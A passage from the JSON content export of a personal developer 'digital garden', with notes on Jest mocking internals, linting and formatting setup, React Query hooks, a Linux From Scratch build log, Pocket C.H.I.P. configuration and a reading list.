mockFn;\n}\n\n// usage\nutils.getWinner = fn((p1, p2) =\u003e p1);\n```\n\n## `jest.spyOn`\n\nWe can use `jest.spyOn` to avoid keeping track of the original implementation (`const originalGetWinner = utils.getWinner`) and cleaning up after the test case (`utils.getWinner = originalGetWinner`) on our own.\n\n```ts\njest.spyOn(utils, \"getWinner\"); // spying on the original implementation\nutils.getWinner.mockImplementation((p1, p2) =\u003e p2);\n\nutils.getWinner.mockRestore(); // cleanup\n```\n\nThis could be implemented this way:\n\n```ts\ntype MockFnType = {\n  mock: { calls: any[] };\n  mockImplementation: (any) =\u003e any;\n};\n\nfunction fn(impl = (args: any[]) =\u003e {}) {\n  const mockFn: MockFnType = (...args: any[]) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(args);\n  };\n  mockFn.mock = { calls: [] };\n  mockFn.mockImplementation = (newImpl) =\u003e (impl = newImpl); // saving the mocked implementation\n  return mockFn;\n}\n\nfunction spyOn(obj: any, property: string) {\n  const originalProperty = obj[property]; // track original value, function\n\n  obj[property] = fn();\n  obj[property].mockRestore = () =\u003e (obj[property] = originalProperty); // adding a way to \"release the mock\"\n}\n```\n\nUp to this point we still were doing something only just slightly more sophisticated to [[course-notes/testing-javascript/mocking#Monkey patching|monkey patching]]. It works only because we're using CommonJS. In ES modules monkey patching does not work.\n\n## `jest.mock`\n\n`jest.mock` returns a mocked implementation of a whole module.\n\n```ts\njest.mock('../utils', () =\u003e { // first arg: relative path to the mocked module\n  // second arg: module factory function\n  return {\n      getWinner: jest.fn((p1, p2) =\u003e p1);\n  }\n});\n\n// cleanup\nutils.getWinner.mockReset();\n```\n\n`.mockReset()` will reset our mock function to the initial state clearing out the `calls`.\n\n`jest.mock` works, because Jest is in control of the whole module system.\n\n\u003e [!tip] Jest hoists the `jest.mock` call to the top of the file, before imports.\n\u003e\n\u003e We don't have to do it manually.\n\nThis is how we can implement it on our own by using `require.cache`.\n\n```ts\nconst utilsPath = require.resolve(\"../utils\");\n\ntype MockFnType = {\n  mock: { calls: any[] };\n  mockImplementation: (any) =\u003e any;\n};\n\nfunction fn(impl = (...args: any[]) =\u003e {}) {\n  const mockFn: MockFnType = (...args: any[]) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(...args);\n  };\n  mockFn.mock = { calls: [] };\n  mockFn.mockImplementation = (newImpl) =\u003e (impl = newImpl);\n  return mockFn;\n}\n\n// @ts-ignore missing properties\nrequire.cache[utilsPath] = {\n  id: utilsPath,\n  filename: utilsPath,\n  loaded: true,\n  exports: {\n    getWinner: fn((p1, p2) =\u003e p1),\n  },\n};\n\ndelete require.cache[utilsPath]; // cleanup\n```\n\nThis is something similar, yet simplified version of what Jest is doing.\n\n## Mocking a module shared across the codebase\n\nUse `__mocks__` directory.\n\n```sh\n$ tree\n├── __mocks__\n│   └── utils.ts\n└── utils.ts\n```\n\nThen in test file:\n\n```ts\njest.mock(\"../utils\");\n```\n\n`jest` knows to pick up the path from **mocks** directory.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/static-analysis":{"title":"Static Analysis","content":"\n*Static analysis* is a method of debugging that is done by automatically examining the source code **without having to execute the program** with tools like `eslint`, `prettier`, `typescript`, `husky`.\n\n## ESLint\n\n- use `ESLint` extension (by Dirk Baeumer) for VS Code\n  - `⌘ + .` provides hints on how to fix the issues\n- `eslint` provides a set of recommended rules that can be _extended_:\n\n```json\n// .eslintrc\n{\n  \"extends\": [\"eslint:recommended\" /* another extension */],\n  \"rules\": {\n    // overrides to extended configurations\n  }\n}\n```\n\n- instead of using `.eslintignore` which is oftenly exactly the same as `.gitignore`, add the flag to `npm script` :\n  - `eslint --ignore-path .gitignore .`\n\n## Prettier\n\n- `--ignore-path .gitignore` is supported in Prettier as well\n- there's a Prettier [Playground](https://prettier.io/playground) in which we can experiment with the configuration and save it to `.prettierrc`\n- use Prettier extension (by Esben Petersen) for VSCode with these options:\n  - `editor.defaultFormatter: \"esbenp.prettier-vscode\"`\n  - `editor.formatOnSave: true`\n- disable unnecessary ESLint rules with `eslint-config-prettier` extension to make sure Prettier and ESLint won't clash\n- `prettier` has a `--list-different` flag used when you want to throw an `Error` if the formatting sucks\n\n## `yarn`\n\n```json\n{\n  \"scripts\": {\n    \"prettier\": \"prettier --ignore-path .gitignore \",\n    \"format\": \"npm run prettier -- --write\"\n    /** \n    `--` makes yarn to use the parameters of \n    `prettier` script without rewriting them \n    effectively making the `format` script: \n    \n    \"format\": \"prettier --ignore-path .gitignore --write\" */\n  }\n}\n```\n\n## TypeScript tips\n\n- **use TypeScript**, at least for types analysis (if you can't for compiling for some reason)\n- use `@typescript-eslint/eslint-plugin` and `@typescript-eslint/parser` for `*.ts(x)` files\n\n## Husky\n\n- use `precommit` hooks to statically analyze the codebase\n- Husky can be integrated with `lint-staged` for those who don't use editor with Prettier/ESLint plugins\n\n## `npm-run-all`\n\n`npm-run-all` is a tool that allows to run `npm` scripts in parallel:\n\n```json\n{\n  \"scripts\": {\n    \"build\": \"/* ... */\",\n    \"check-format\": \"/* ... */\",\n    \"check-types\": \"/* ... */\",\n    \"lint\": \"/* ... */\",\n    \"validate\": \"npm-run-all check-types check-format lint build\" // \u003c--\n  }\n}\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/":{"title":"Web development","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/glossary/DOM":{"title":"Document Object Model","content":"\n_Document Object Model_ is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content.\n\nA web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)\n\n## References\n\n- [DOM @ w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html)\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/":{"title":"React","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/component-state-vs-class-fields":{"title":"","content":"Changing the state of the component causes UI to re-render. Thus, keeping UI-agnostic data as class fields is okay.\n\nIt's important not to re-render UI if it is not necessary, as this impacts the performance.\n\n## Resources\n\n- [why-did-you-render](https://github.com/welldone-software/why-did-you-render) package\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/react-query/":{"title":"React Query","content":"\nA pre-configured library for maintaining the server state. Improves handling the data fetching, caching, synchronizing and updating the server state in React application.\n\n## Key parts\n\n- a [[development/web/react/react-query/QueryClient]]\n- the [[development/web/react/react-query/useQuery]] and [[development/web/react/react-query/useMutation]] hooks\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/react-query/QueryClient":{"title":"QueryClient","content":"\n## Example\n\n```jsx\nimport { QueryClient, QueryClientProvider } from \"react-query\";\nimport { ReactQueryDevtools } from \"react-query/devtools\";\n\n/* This needs to be outside of the React App */\nconst queryClient = new QueryClient({);\n\nconst App = () =\u003e {\n\treturn (\n\t\t\u003cQueryClientProvider client={queryClient}\u003e\n\t\t\t{/* ... */}\n\t\t\t\u003cReactQueryDevtools initialIsOpen /\u003e {/* optional but useful */}\n\t\t\u003c/QueryClientProvider\u003e\n\t);\n};\n\nexport default App;\n```\n\n## Useful methods\n\n- `invalidateQueries([key])` - makes the query/queries with a given key invalid, forcing React Query to fetch that data again. Can be used in [[development/web/react/react-query/useMutation]] hook -\u003e `onSuccess` method.\n- `setQueryData` - used for [[optimistic updates]] of the query's cached data\n- `prefetchQuery` - allows to fetch data earlier than it's needed\n  - e.g. to improve UX\n- `clear` - clears all connected caches 🤷‍♂️\n\n## `useQueryClient` hook\n\nAllows to assign the present `QueryClient` to a variable when needed.\n\n```js\nimport { useQueryClient } from \"react-query\";\n\nconst queryClient = useQueryClient();\n\n/* ... */\nqueryClient.clear();\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/react-query/react-query-ynab":{"title":"Demo of React Query + YNAB","content":"\nI am an YNAB heavy user. While learning [[development/web/react/|React Query]] I decided to create a demo that uses [YNAB API](https://api.youneedabudget.com/v1). This file describes the high-level process of the demo development and my findings.\n\nThe full code is [here](https://github.com/kkoscielniak/react-query-ynab). I've also added links to particular files/commits (denoted as 📄).\n\n## Assumptions\n\n- relying on React Query as much as possible\n- very basic. Two queries, one mutation. _Enough is enough_.\n- using React Navigation for simplicity\n- diching the styling\n\n## Log\n\n### Initial configuration\n\nI've decided to use `create-react-app` just for the sake of simplicity.\n\nI've created an API client ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/queries/apiClient.js)) for YNAB using `apisauce` and added first _query_ ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/queries/budgets.js)) (a function that fetches budgets from YNAB; `getBudgets`).\n\nThen I've created a `BudgetSelectionScreen` ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/screens/BudgetSelectionScreen.js)) (In YNAB you can keep tabs on several budgets with one subscribtion and I wanted to use a testing one anyway).\n\n### Adding queries\n\nI configured the [[development/web/react/react-query/QueryClient]] ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/App.js)) and with [[development/web/react/react-query/useQuery]] hook I utilised the `getBudgets` query from before and rendered links to a details screen ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/App.js)).\n\nI moved the app to React Native Web to be able to [use React Navigation](https://reactnavigation.org/docs/web-support/). I've added `BudgetDetailsScreen` and passed the selected `budgetId` to it via props.\n\nIn the meantime I learned the [[development/web/react/react-query/QueryClient]] shouldn't live inside the React App so I moved it outside ([📄](https://github.com/kkoscielniak/react-query-ynab/commit/451565cc19bf76038d67c7ff0d320b618097e804)) (and added useful React Query Devtools) ([📄](https://react-query.tanstack.com/devtools)).\n\nThen I've added another query ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/22b20426777db5f58d3f0a723deaafc881494524/src/queries/transactions.js)) for fetching the transactions for a given `budgetId`. This is where I learned about [[development/web/react/react-query/useQuery#Example with passing the parameters|preferred way of passing parameters]] to the queries. Ultimately I rendered the transactions.\n\n### Adding mutation\n\nI wanted to have a way of adding the transactions to my YNAB budget. In React Query it's done with [[development/web/react/react-query/useMutation]] hook.\n\nI've created a separate component ([📄](https://github.com/kkoscielniak/react-query-ynab/blob/main/src/components/AddTransaction.js)) for the _Add Transaction form_ that had 2 inputs (_Payee_ and _Amount_) and a button that ran the mutation.\n\n### Invalidating the cached query\n\nLastly, I wanted to make sure the transactions the I see in my little app reflect the ones that are, in fact, in my budget. To do that I **just** needed to invalidate the query created 2 paragraphs above.\n\nTo do that I just needed to call the `invalidateQueries` [[development/web/react/react-query/QueryClient#Useful methods|method]] of the `QueryClient` in the `onSuccess` [[development/web/react/react-query/useMutation#Methods inside of useMutation options|callback]] of the mutation ([📄.](https://github.com/kkoscielniak/react-query-ynab/commit/1dc7c9ebb37d2736f48c9c4bb07963aa712d5d76)).\n\nAnd that's it. Honestly? It was great.\n\n## Conclusions\n\nIt was a breeze. I didn't know this library before and right now I think it'll be my preferred way of handling the state of the remote servers. I just scratched the surface and yet I was able to quickly create a pretty neat demo that is performant and features-rich. And the best part is that I didn't have to think of how to develop those features. Nicely done, Tanner 🙌.\n\n\u003c!-- ---\n\n###### Meta\n\nLast updated: 29 Nov 2021\n--\u003e\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/react-query/useMutation":{"title":"useMutation hook","content":"\nUsed to update/create/delete data. Provides the `mutate` function that takes the parameters. Returns the status of our API call.\n\nThe status can be\n\n- `idle`\n- `loading` for the currently running mutation\n- `error` when encountered\n- `success`\n\n## Example\n\n```js\nconst addTransaction = async ({ budgetId, payee, value, accountId }) =\u003e {\n  const { data } = await client.post(`/budgets/${budgetId}/transactions`, {\n    transaction: {\n      payee_name: payee,\n      amount: value,\n      date: \"2021-09-01\",\n      account_id: accountId,\n    },\n  });\n  return data;\n};\n\n/* ... */\n\nconst { isLoading, isError, mutate } = useMutation(addTransaction);\n\n/* ... */\n\nmutate({\n  budgetId,\n  payee: payeeText,\n  value: valueText,\n  accountId: selectedAccountId,\n});\n```\n\n## Request Retries\n\nYou can pass the `retry` option with the number of times React Query should retry the mutation **after reconnection**.\n\n```js\nconst mutation = useMutation(addArticle, { retry: 3 });\n```\n\n## Methods inside of `useMutation` options\n\n- `onMutate` - fires before `useMutation`. Useful when you want to run [[optimistic updates]] on local cache and update data on the UI side before updating them on the server.\n- `onSuccess` - fires when the mutation is successful\n- `onError` - fires when the mutation encounters an error\n  - a common practice is to set cache to previous data in such case\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/web/react/react-query/useQuery":{"title":"useQuery hook","content":"\nA hook used to fetch data in [[development/web/react/react-query/_index|React Query]].\n\nAllows to control the state of the component depending on the retrieved data. Helps with caching and refetching the remote data as well.\n\n## Example\n\nYou need a [[development/web/react/react-query/QueryClient]] configured and a _query function_ (a function that returns a [[Promise]] that either resolves the data, or throws an error).\n\n```jsx\nimport { View, Text } from \"react-native-web\";\nimport { Link } from \"@react-navigation/native\";\nimport { useQuery } from \"react-query\";\nimport { getBudgets } from \"../queries/budgets\";\n\nconst BudgetListingScreen = ({ navigation }) =\u003e {\n  const {\n    isLoading,\n    data: responseData,\n    isError,\n    error,\n  } = useQuery(`budgets`, getBudgets);\n\n  if (isLoading) {\n    return \u003cText\u003eLoading...\u003c/Text\u003e;\n  }\n\n  if (isError) {\n    return \u003cText\u003eError: {error}\u003c/Text\u003e;\n  }\n\n  const budgetData = responseData?.data;\n\n  return (\n    \u003c\u003e\n      {budgetData.budgets.map((budget) =\u003e {\n        const { id: budgetId, name } = budget;\n\n        return (\n          \u003cLink\n            key={budgetId}\n            to={{\n              screen: \"BudgetDetails\",\n              params: { budgetId },\n            }}\n          \u003e\n            {name}\n          \u003c/Link\u003e\n        );\n      })}\n    \u003c/\u003e\n  );\n};\n```\n\nWhen making a request for the first time, `isLoading` is true until the the `data` is ready or an `error` occures.\n\nThe **unique key** in `useQuery(key, fn)` (_budgets_ in this case) is needed for fetching, caching and sharing the cached data throughout the application.\n\nWhen using the query with the same key again, React Query returns the cached data first, fetches new dataset in the background and updates the UI only if the new dataset differs from the old one.\n\n## Example with passing the parameters\n\nThere are few ways to pass the parameters to the query, but the preferred one is:\n\nGiven the query that has **an array as a query key**\n\n```js\nconst { budgetId } = route.params;\n\nconst {\n  data,\n  /* [...] */\n} = useQuery([`transactions`, budgetId], getTransactions);\n```\n\nYou can access the particular keys from the `queryKey` property.\n\n```js\nexport const getTransactions = async ({ queryKey }) =\u003e {\n  const [_, budgetId] = queryKey; // this is taken from the query key array\n\n  const { data } = await client.get(`/budgets/${budgetId}/transactions`);\n  return data;\n};\n```\n\n## Useful features\n\n- It's possible to fetch data in one component and retrieve it from cache in another one just by using the same query key\n- Running queries in parallel is possible with [useQueries](https://react-query.tanstack.com/guides/parallel-queries#dynamic-parallel-queries-with-usequeries) hook\n- You can make sequences of [dependent queries](https://react-query.tanstack.com/guides/dependent-queries)\n  - for example when the data obtained by one query is needed to run another one\n- [pagination](https://react-query.tanstack.com/examples/pagination), [load more](https://react-query.tanstack.com/examples/load-more-infinite-scroll) and else\n\n## Drawbacks\n\nThe counterintuitive part for me was why the cache gets purged on page refresh. There is an [experimental feature](https://react-query.tanstack.com/plugins/createWebStoragePersistor) (as of v3.30.0) that should make the cache persistent, but either it didn't work because of its experimental status or I couldn't use it properly. To investigate when needed.\n\n\u003c!--\nlastUpdated: 24 Nov 2021\n--\u003e\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/":{"title":"Linux stuff","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/glossary/umask":{"title":"umask","content":"\nFile creation mask\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/linux-from-scratch/":{"title":"Linux From Scratch","content":"\n_[Linux From Scratch](https://www.linuxfromscratch.org/)_ is an enthusiast project that provides a step-by-step guide for building our own Linux distro.\n\nIn December 2022, I've had a bit of spare time and decided to (at least try to) build one on my own.\n\nMy motivation behind this endeavour is to understand the advanced Linux, what lies underneath what I know about Linux operating systems and to learn how to work with its internals. Also, for me it's **a tribute to my former self** - the kid who was once given a diploma for telling stories about Linux' superiority.\n\nI **don't intent** to use the final result - I am a macOS user for around 8 years now and - unfortunately - I live in a golden garden (or cage) of Apple's ecosystem. To leave this place, I'd need to do lots more than installing another OS.\n\nAnd even if I'd want to switch to Linux full-time, I would install something battle tested instead of my lil' Frankensteins monster.\n\nAnyways, this folder keeps my notes about the whole process.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/linux-from-scratch/fetching-packages":{"title":"Fetching necessary packages","content":"\nI've began with obtaining the packages that are needed to build a basic Linux system.\n\nI went with the `wget-list` way. First, I've downloaded the `wget-list` from the mirror, then I've `wget` all the listed packages (plus a `md5sums` file for verification):\n\n```sh\nwget https://lfs.opensource.foundation/lfs/downloads/stable/wget-list --directory-prefix=/mnt/lfs/sources\nwget --input-file=\"/mnt/lfs/sources/wget-list\" --continue --directory-prefix=/mnt/lfs/sources\nwget https://lfs.opensource.foundation/lfs/downloads/stable/md5sums --directory-prefix=/mnt/lfs/sources\n```\n\nI checked the `md5sum`s to see if I'm good to go with that script:\n\n```sh\n# source-check.sh\npushd $LFS/sources\n  md5sum -c md5sums\npopd\n```\n\nThat's how I knew I'm missing [`expat-2.4.8.tar.xz`](https://github.com/libexpat/libexpat/releases/download/R_2_4_8/expat-2.4.8.tar.xz) (because it was moved from SourceForge to GitHub) and `zlib-1.2.12.tar.xz` (an update became available, so I've downloaded this particular version from [here](https://www.zlib.net/fossils/); since no `xz` archive is available, I wasn't able to check the MD5 sum for this one. We'll see how it goes).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/linux-from-scratch/final-preparations":{"title":"Final preparations","content":"\nI've created the simple file system on my target partition with that script:\n\n```sh\n#!/bin/bash\nexport LFS=/mnt/lfs\n\nmkdir -pv $LFS/{etc,var} $LFS/usr/{bin,lib,sbin}\nfor i in bin lib sbin; do\n  ln -sv usr/$i $LFS/$i\ndone\ncase $(uname -m) in\n  x86_64) mkdir -pv $LFS/lib64 ;;\nesac\n\nmkdir -pv $LFS/tools\n```\n\n\u003e [!tip] `mkdir -v`\n\u003e\n\u003e I didn't know `mkdir` can be verbose. The same goes with `mv` (as I'll learn pretty soon).\n\nThen I've added the `lfs` user to my Manjaro installation to reduce risk of destroying my host:\n\n```sh\n$ sudo groupadd lfs # create `lfs` group\n$ sudo useradd -s /bin/bash -g lfs -m -k /dev/null lfs # create `lfs` user\n$ sudo passwd lfs # set password for `lfs`\n\n$ chown -v lfs $LFS/{usr{,/*},lib,lib64,var,etc,bin,sbin,tools} # set `/mnt/lfs` ownership to `lfs`\n\nsu - lfs # login as `lfs` (`-` stands for `login shell`, check `bash(1) manpage`)\n```\n\nI've cleaned up the environmental variables for `lfs` user with this `.bash_profile` and `.bashrc` configs:\n\n```sh\n# .bash_profile\nexec env -i HOME=$HOME TERM=$TERM PS1='\\u:\\w\\$ ' /bin/bash`\n```\n\n```sh\n# .bashrc\nset +h # make bash to always lookup $PATH when a program is about to run (disable bash's hash function)\numask 022  # ensure that created files are only writable by their owner, but are readable and executable by anyone\nLFS=/mnt/lfs\nLC_ALL=POSIX\nLFS_TGT=$(uname -m)-lfs-linux-gnu\nPATH=/usr/bin\nif [ ! -L /bin ]; then PATH=/bin:$PATH; fi\nPATH=$LFS/tools/bin:$PATH CONFIG_SITE=$LFS/usr/share/config.site\nexport LFS LC_ALL LFS_TGT PATH CONFIG_SITE\n```\n\n\u003e [!tip] Emptying the environment\n\u003e\n\u003e When logging in the initial shell is usually a login shell which reads the `/etc/profile` of the host (probably containing some settings and environment variables) and then `.bash_profile`. The `exec env -i [...] /bin/bash` command replaces the running shell with a new one with a **completely empty environment**, except for what was set with that command.\n\u003e\n\u003e The new instance of the shell is a _non-login_ shell, which does not read, and execute, the contents of `/etc/profile`/`.bash_profile`, but rather reads, and executes, the `.bashrc`.\n\nI've also renamed `/etc/bashrc` to `/etc/bashrc.NOUSE` to avoid preconfiguring `bash` with stuff that may interfere with the `lfs` (user) environment.\n\n\u003e [!tip] `/etc/bash.bashrc`\n\u003e\n\u003e Some distros add a non-documented instantiation of `/etc/bash.bashrc` to the initialization of `bash`. Manjaro does that for sure.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/linux-from-scratch/introduction":{"title":"Introduction","content":"\nInitially I wanted to go through [[linux/linux-from-scratch/|LFS]] in a Virtual Machine. Unfortunately that didn't play well as:\n\n- emulating `x86_64` architecture on Apple Silicon sucks\n- I could use `arm64` distro image in [UTM](https://getutm.app/), but I'd probably need to figure out architecture-related details on my own, as LFS does not cover these\n  - I've even installed Ubuntu Server for `arm64` in a VM and the experience was bad from the very beginning.\n\nInstead of this, I opted for an older Dell Latitude E6400 computer lying around. I've installed [Manjaro Linux](https://manjaro.org/) as a host for building my LFS.\n\nI've partitioned my SSD in such way:\n\n- `/boot` (200MB) - recommended by LFS handbook\n- `/` (30GB) - Manjaro Linux (the _build_ or _host_ partition)\n- `/home` (50GB) - shared `home` to use in both Manjaro and LFS\n- `/mnt/lfs` (30GB) - LFS _target_ partition\n\nI've also installed and configured `openssh` so I can use my [[tools/hardware/keychron|Keychron]] instead of this clunky old laptop keyboard. Building LFS is done in CLI anyway.\n\n## Key assumptions\n\nWhat I want to build doesn't have to be usable. I'll be happy if it will boot at all. That being said, I won't look for community-driven security patches, GUIs, auditing the packages I'm adding to my build etc, etc.\n\nMaybe, at some point, I'll take a look at [Beyond LFS](https://www.linuxfromscratch.org/blfs/), but not necessarily these Christmas.\n\nAlso, I won't describe every option for building the tools in the process, but if something catches my eye, I'll briefly explain it.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/pocketchip/":{"title":"Pocket C.H.I.P","content":"\nI've bought the [Pocket C.H.I.P.](https://shop.pocketchip.co/collections/frontpage/products/pocket-c-h-i-p-new) device recently for learning purposes. And to have some fun.\n\nPocket C.H.I.P. is a portable, battery-powered Linux computer with a 480 x 272 touchscreen and something that resembles a QWERTY keyboard. It has the potential of Raspberry Pi, and it comes with a Debian-based OS along with a custom launcher and apps.\n\nThing is the C.H.I.P. is kinda obsolete (the company that made it, Next Thing Co., is now defunct), and it may be intimidating at first. I am slowly getting to know the device better, configuring it and figuring out what can I use it for. You may get something out of mine notes if you have/would like to have a device like this.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/pocketchip/packages-and-ssh":{"title":"Package manager and SSH","content":"\n## Setting up package manager\n\nThe Next Thing Co.'s package repository is dead for a long time, but one guy still mirrors them.\n\nYou can refer to [this page](http://chip.jfpossibilities.com/chip/debian/) to make the package manager work. Don't forget to `sudo apt-get update` (I wouldn't risk `upgrade` though).\n\n## Setting up `ssh`\n\nTo install and enable SSH:\n\n```sh\nsudo apt-get install openssh-server\nsudo systemctl enable ssh.socket\n```\n\n\u003e You need `sudo` to use commands like `ifconfig`, `shutdown`, `reboot`. Without that **they won't even show up** 😲\n\nReboot, then check the IP using `sudo ifconfig` and issue `ssh chip@\u003cip\u003e` on another host. By default the credentials are `chip`/`chip`.\n\n## Packages\n\nRight after setting up package manager and SSH access, I've installed these packages to make my life a bit easier.\n\n- `vim` - instead of quirky `vi`\n- `mc` - Midnight Commander is a must for me\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/pocketchip/webbrowser":{"title":"Installing Web Browser","content":"\nBy default, Pocket C.H.I.P. is packed with `firefox-esr`, but right after starting it (which itself took, like, 30sec) the first tab crashed immediately, so probably it's not the way to go.\n\nThere's also something called `surf`, but it looks like it does not have any functionalities apart from displaying something, somehow.\n\n## Installing and configuring `dwb`\n\n![](digital-garden/assets/dwb_1.png)\n\n`dwb` is a small, keyboard-driven browser based on WebKit, that I just heard of. Unlike `firefox-esr` it starts in few seconds and has a decent performance. It looks like Opera Mini back in 2006, which is perfect for a device like this. You can install it with:\n\n```sh\nsudo apt install dwb\n```\n\nBy default, it will open webpages in _desktop mode_, but we can enforce mobile versions by editing `~/.config/dwb/settings`:\n\n```\ndefault-height=272\ndefault-width=420\nuser-agent=Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\n```\n\n## Adding `dwb` to home screen\n\nTo make changes to C.H.I.P.s home screen, you need to edit `/usr/share/pocket-home/config.json`. There's `pages.items` array that defines what icons to show in the home screen (up to 6 of them). I've replaced the _Get help_ icon with:\n\n```json\n{\n  \"name\": \"Web Browser\",\n  \"icon\": \"appIcons/webbrowser.png\",\n  \"shell\": \"dwb\"\n},\n```\n\nAlso, you need to restart `pocket-home` by killing it:\n\n```sh\nskill pocket-home\n```\n\n(I had also to restart the device once, as it didn't start again). Now it looks like this:\n![](digital-garden/assets/pockethome_1.png)\n\n## Using `dwb`\n\n- `ctrl + q` - quit\n- `o` - open URL\n- `j / ↑` - scroll up\n- `k / ↓` - scroll down\n- `h` - go back\n- `l` - go forward\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/linux/screenshots-via-ssh":{"title":"Screenshots via SSH","content":"\nTo take a screenshot of another X session running:\n\n```sh\nDISPLAY=:0 scrot\n```\n\nTo download the screenshot via `scp`:\n\n```sh\nscp username@hostname:/path/to/remote/file /path/to/local/file\n```\n\nUseful with [[linux/pocketchip/|Pocket C.H.I.P.]]\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/others/":{"title":"Others","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/others/digital-garden":{"title":"Digital Garden","content":"\n\u003e For the most part I just wing it ad hoc and hope for the best. 😅\n\u003e\n\u003e ~ Joel Hooks\n\n## _Digital_ what?\n\nThis site is a [digital garden](https://joelhooks.com/digital-garden/), not a blog. I keep it mostly for myself, but I suppose the knowledge here might be helpful to you as well.\n\nThe goal of this project is to be a living reference of what I've learnt, what I am interested in and what skills I actually have.\n\nThe main value is not in the carefully crafted blog posts full of anectodes, graphs, opinions and else. Instead, it lies in _linking my thinking_. Recently I learn a lot and I want to find patterns that will help me to improve in my field of expertise.\n\n## Non-linearity\n\nDue to a _non-linear_ nature of this site, I might post here ideas, snippets, resources, thoughts, bits of knowledge, projects of mine or basically anything I find interesting and relating to the rest of the content here. It's basically my own, basic Wikipedia.\n\nThis also means not everything is going to be well-writen, perfectly organised, or even truthy. Things change, I change, JavaScript frameworks change. It's hard to keep up sometimes and people make mistakes.\n\nThe good part is that the whole thing is [open-source](https://github.com/kkoscielniak/the-garden-content), so if you stumble upon something evidently wrong, you can always open a PR.\n\n## Technicals\n\nMy digital garden is built on top of the [Obsidian](https://obdidian.md) app and the open-source [Quartz](https://quartz.jzhao.xyz/) project (that itself uses [Hugo](https://gohugo.io) behind the scenes).\n\nI've modified the Quartz template a bit and I track these changes on [GitHub](https://github.com/kkoscielniak/the-garden). Probably things are going to break a lot when I decide to bump the Quartz version, but I don't care.\n\nFor the simplicity sake, I keep the `content/` in a [separate repo](https://github.com/kkoscielniak/the-garden-content) (referenced by Quartz as a `git submodule`). This should ensure that whenever I decide to use a different _gardening_ solution, the content will be safe. However, because of that, occasionally things might be broken (e.g. _last-updated_ feat is not working as of now).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/reading/":{"title":"Reading","content":"\nHere's the **absolutely incomplete** list of what I've read so far. Sometimes with summary and booknotes.\n\n## Currently reading\n\n- 📱 [Social Engineering. The Art Of Human Hacking](https://www.wiley.com/en-us/Social+Engineering:+The+Art+of+Human+Hacking-p-9780470639535) - Christopher Hadnagy\n\n## 2023\n\n- 📱 [The Pentester's Blueprint](https://www.amazon.com/Pentester-BluePrint-Your-Guide-Being/dp/1119684307) - Phillip L. Wylie, Kim Crawley - ⭐️⭐️⭐️⭐️\n\n## 2022\n\n- 🎧 [Deep Work](https://www.amazon.com/Deep-Work-Focused-Success-Distracted/dp/1455586692) - Cal Newport - ⭐️⭐️⭐️⭐️⭐️\n- 📱 [Programowanie na Autopilocie](https://pna.zautomatyzowani.pl/) 🇵🇱 - Adam Gospodarczyk - ⭐️⭐️⭐️⭐️\n- 📱 [Codzienność na Autopilocie](https://codziennosc.zautomatyzowani.pl/) 🇵🇱 - Adam Gospodarczyk - ⭐️⭐️⭐️⭐️⭐️\n- 📱 [[reading/notes/kaizen|One Small Step Can Change Your Life: The Kaizen Way]] 🇵🇱 - Robert Maurer - ⭐️⭐️⭐️\n\n## 2021\n\n- 📱 [A w Konopiach Strach](https://www.empik.com/a-w-konopiach-strach-vetulani-jerzy-mazurek-maria,p1230754457,ksiazka-p) 🇵🇱 - Jerzy Vetulani, Maria Mazurek - ⭐️⭐️⭐️⭐️\n- 🎧 [Essentialism: The Disciplined Pursuit of Less](https://www.amazon.com/Essentialism-Disciplined-Pursuit-Greg-McKeown/dp/0804137382) - Greg McKeown - ⭐️⭐️⭐️⭐️⭐️\n- 🎧 [Ego is the Enemy](http://egoistheenemy.com) - Ryan Holiday - ⭐️⭐️⭐️⭐️⭐️\n- 🎧 [The Checklist Manifesto](https://www.amazon.com/The-Checklist-Manifesto-audiobook/dp/B0031Q9ZWY) - Atul Gawande - ⭐️⭐️⭐️⭐️\n- 📱 [[reading/notes/lifechanging-magic-of-tidying-up|The Life-changing Magic of Tidying Up]] - Marie Kondo - ⭐️⭐️⭐️⭐️⭐️\n\n## 2020\n\n- 🎧 [Atomic 